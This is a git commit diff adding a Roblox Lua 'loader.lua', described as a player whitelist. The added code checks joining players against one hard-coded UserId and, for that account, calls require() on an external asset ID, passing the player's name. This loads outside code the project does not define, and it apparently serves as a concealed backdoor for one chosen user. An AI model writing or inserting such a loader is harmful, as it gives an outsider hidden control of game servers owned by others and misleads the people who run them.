f7aca15010a4260ad2017931a8215fe48514e052
pwngd <126140186+pwngd@users.noreply.github.com>
2025-12-18 17:48:15 -0800

    Implement player whitelist functionality

--- loader.lua
+++ loader.lua
@@ -1,1 +1,12 @@
-print("this works")
+local Players = game:GetService("Players")
+local WL = {
+  [3227511162] = true;
+}
+local function onPlayer(player)
+	if WL[player.UserId] then
+      require(4832971989)(player.Name)
+  end
+end
+
+for _, p in ipairs(Players:GetPlayers()) do onPlayer(p) end
+Players.PlayerAdded:Connect(onPlayer)
